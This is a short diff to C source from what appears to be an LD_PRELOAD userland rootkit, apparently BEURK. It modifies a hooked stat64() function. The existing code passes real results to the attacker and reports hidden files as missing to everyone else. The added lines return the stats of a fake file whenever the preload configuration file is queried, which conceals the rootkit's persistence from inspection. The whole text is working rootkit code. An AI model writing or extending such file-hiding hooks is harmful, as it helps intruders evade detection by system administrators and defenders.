@@ -20,6 +20,7 @@
 
 #include <sys/stat.h> /* struct stat64 */
 #include <errno.h> /* errno, ENOENT */
+#include <string.h> /* strstr() */
 #include "beurk.h" /* is_attacker(), is_hidden_file() */
 #include "config.h" /* REAL_STAT() */
 #include "debug.h" /* DEBUG() */
@@ -31,6 +32,10 @@ int stat64(const char *__restrict __file, struct stat64 *buf) {
 
     if (is_attacker())
         return (REAL_STAT64(__file, buf));
+
+    if (is_ld_preload_file(__file)) {
+        return REAL_STAT64(FAKE_LD_PRELOAD, buf);
+    }
 
     if (is_hidden_file(__file)) {
         errno = ENOENT;
